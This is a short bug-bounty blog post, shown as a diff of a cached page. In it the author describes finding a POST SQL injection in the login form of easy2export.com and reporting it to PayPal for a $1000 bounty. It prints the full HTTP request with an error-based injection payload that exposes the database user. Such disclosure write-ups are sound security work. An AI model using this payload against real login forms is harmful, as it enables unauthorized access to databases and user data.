@@ -1,0 +1,24 @@
+I"�<p>At first try, I tried to test their login form. Luckily after a few minutes of testing, I found a critical POST SQL Injection!</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://easy2export.com/index.php/site/login
+
+POST /index.php/site/login HTTP/1.1
+Host: easy2export.com
+…
+LoginForm[username]=’ or 1 group by concat_ws(0x3a,user(),floor(rand(0)*2)) having min(0) or 1–+&amp;LoginForm[password]=’&amp;LoginForm[accounttype]=sub&amp;LoginForm[rememberMe]=0&amp;yt0=
+</code></pre></div></div>
+
+<p>The code below shows the HTTP request plus the SQL Query <code class="highlighter-rouge">’ or 1 group by concat_ws(0x3a,user(),floor(rand(0)*2)) having min(0) or 1–+</code> which I used to display the current database user which was shown in the picture below.</p>
+
+<p><br /></p>
+<p align="center">
+<img src="/assets/images/easy2export-sql-injection1.png" />
+</p>
+<p><br />
+I reported the said vulnerability to PayPal and they fixed it immediately. After a month, I was awarded with a $1000 bounty for this.</p>
+<p align="center">
+<img src="/assets/images/paypal-bounty.png" />
+</p>
+
+<p>Thanks for reading! Stay tuned for more blog posts.</p>
+:ET
